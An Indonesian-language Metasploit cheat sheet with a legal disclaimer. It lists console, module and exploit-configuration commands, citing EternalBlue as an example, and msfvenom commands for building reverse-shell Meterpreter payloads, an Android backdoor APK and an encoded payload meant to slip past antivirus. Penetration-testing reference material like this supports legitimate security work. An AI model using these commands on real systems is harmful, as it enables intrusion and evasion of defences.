PERINGATAN HUKUM

Informasi ini disediakan hanya untuk tujuan pendidikan dan pengujian penetrasi yang sah. Penggunaan teknik ini tanpa izin terhadap sistem yang tidak Anda miliki atau tidak memiliki izin untuk menguji adalah tindakan ilegal dan dianggap sebagai kejahatan cyber. Selalu dapatkan otorisasi yang tepat sebelum melakukan pengujian keamanan.

Perintah Dasar 5 perintah

msfconsole
Memulai konsol Metasploit Framework
help
Menampilkan semua perintah yang tersedia
exit
Keluar dari Metasploit
version
Menampilkan versi Metasploit
banner
Menampilkan banner acak

Manajemen Modul 6 perintah

search [type:exploit/auxiliary/payload] [keyword]
Mencari modul (contoh: search exploit windows smb)
use [module_path]
Memilih modul (contoh: use exploit/windows/smb/ms17_010_eternalblue)
show options
Menampilkan opsi yang dapat dikonfigurasi untuk modul saat ini
show payloads
Daftar payload yang kompatibel dengan exploit saat ini
info
Menampilkan informasi detail tentang modul saat ini
back
Kembali ke konteks sebelumnya

Konfigurasi Exploit 6 perintah

set [option] [value]
Mengatur opsi modul (contoh: set RHOSTS 192.168.1.100)
setg [option] [value]
Mengatur opsi global yang bertahan di antara modul
unset [option]
Menghapus pengaturan opsi
exploit
Menjalankan exploit saat ini
run
Alias untuk exploit
check
Memeriksa apakah target rentan tanpa melakukan eksploitasi

Generasi Payload (msfvenom) 3 perintah

msfvenom -p [payload] LHOST=[IP] LPORT=[PORT] -f [format] -o [file]
Membuat payload (contoh: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe)
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o virus.apk
Membuat backdoor untuk Android
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
Membuat payload terenkripsi (untuk menghindari deteksi antivirus)
